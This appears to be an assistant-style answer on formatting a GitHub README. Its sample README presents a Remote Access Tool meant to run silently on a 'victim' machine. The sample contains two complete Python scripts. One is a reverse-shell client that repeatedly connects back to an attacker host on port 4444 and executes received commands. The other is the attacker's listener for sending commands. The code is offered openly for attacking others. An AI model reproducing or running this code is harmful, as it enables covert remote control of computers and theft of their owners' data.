To format this properly in your **GitHub README.md file**, follow these steps:

### **1. Use Markdown for Formatting**
GitHub uses Markdown to format text in the README file. To ensure the Python code is well-structured and readable, wrap it in **triple backticks** (` ``` `) and specify the `python` language for syntax highlighting.

### **2. Example README File Format**
Hereâ€™s how you can structure your **README.md** file:

# Remote Access Tool (RAT)

## Overview
A **Remote Access Tool (RAT)** is used to control a target machine remotely.  
In simple terms:
- Allows the attacker to execute commands on the target system.
- Can download/upload files and access sensitive data.
- Runs silently in the background, making detection difficult.

## How It Works
The project consists of two programs:

### **1. Client.py (Victim's Machine)**
- This script runs silently on the victimâ€™s computer.
- It continuously attempts to connect to the attackerâ€™s machine.
- Once connected, it waits for and executes commands sent by the attacker.

```python
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker_ip", 4444))  # Replace "attacker_ip" with the attacker's IP address
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

def main():
    while True:
        try:
            connect()
        except:
            pass

if __name__ == "__main__":
    main()
```

### **2. Server.py (Attacker's Machine)**
- The attacker runs this script to control the victimâ€™s machine.
- It listens for incoming connections and executes commands remotely.

```python
import socket

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4444))  # Bind to all available interfaces on port 4444
    s.listen(1)
    print("Waiting for connection...")
    conn, addr = s.accept()
    print(f"Connected to {addr}")
    while True:
        command = input("Enter command: ")
        conn.send(command.encode())
        if command.lower() == "exit":
            break
        output = conn.recv(4096).decode()
        print(output)
    conn.close()

if __name__ == "__main__":
    start_server()
```
